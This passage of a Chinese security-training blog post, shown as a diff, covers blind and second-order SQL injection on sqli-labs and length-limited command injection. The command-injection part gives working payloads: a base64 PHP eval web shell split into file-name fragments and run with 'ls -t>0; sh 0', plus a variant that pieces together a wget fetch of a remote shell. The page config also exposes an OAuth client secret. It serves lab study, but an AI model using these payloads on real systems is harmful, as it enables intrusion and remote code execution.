datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re5 = requests.get(url+pay5)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			flag = flag+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,flag)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>sqli-labs第27关</p>
+<p>通过注册用户提交数据给数据库，再点击查看数据从数据库里取出数据显示出来。如果第一步存数据没有做到足够过滤，第二步的显示则存在注入漏洞。</p>
+<p>首先测试正常名字，显示正常。再尝试单引号闭合后面加个sleep，发现不再显示且有延迟。之后union查询即可。</p>
+<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h2 id="限制命令长度-lt-8"><a href="#限制命令长度-lt-8" class="headerlink" title="限制命令长度&lt;8"></a>限制命令长度&lt;8</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>写<code>cat</code>，<code>*</code>匹配：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;<span class="built_in">cat</span></span><br><span class="line">?cmd=* ../*</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>base64加密一句话木马：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>
+
+<p>要传入的命令即：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|<span class="built_in">base64</span> -d&gt;1.php</span><br></pre></td></tr></table></figure>
+
+<p>然后分段传入，注意特殊字符要加转义符。最后执行<code>ls -t&gt;0</code>，即按创建逆序依次写入文件<code>0</code>中，最后<code>sh 0</code>即可在同级目录下建好一句话木马文件<code>1.php</code>。</p>
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;==\\</span><br><span class="line">&gt;pOw\\</span><br><span class="line">&gt;MV0\\</span><br><span class="line">&gt;1Rb\\</span><br><span class="line">&gt;BPU\\</span><br><span class="line">&gt;kX1\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p>与方法2类似，不过一句话木马不再echo写入，而是通过wget远程获取本机写好的木马。</p>
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?1=&gt;hp</span><br><span class="line">?1=&gt;ell.p\\</span><br><span class="line">?1=&gt;\ sh\\</span><br><span class="line">?1=&gt;\ -O\\</span><br><span class="line">?1=&gt;com\\</span><br><span class="line">?1=&gt;x.\\</span><br><span class="line">?1=&gt;\ xx\\</span><br><span class="line">?1=&gt;wget\\</span><br><span class="line">?1=<span class="built_in">ls</span> -t&gt;a</span><br><span class="line">?1=sh a</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/1094/" rel="prev" title="【网络安全4x02】洞明科技网络安全培训 --- day2">
+                  <i class="fa fa-chevron-left"></i> 【网络安全4x02】洞明科技网络安全培训 --- day2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/1096/" rel="next" title="【网络安全5x01】洞明科技网络安全红蓝对抗培训 --- day1">
+                  【网络安全5x01】洞明科技网络安全红蓝对抗培训 --- day1 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa-solid fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"client_id":"96531982aa814e82e033","client_secret":"9d64fd0a7523408d110bfc9839658aaa2a0ee62e","repo":"Blog_Comments","github_id":"gaoteng17","admin_user":"gaoteng17","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"db2a49a7946d0820aa7132950943b005"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
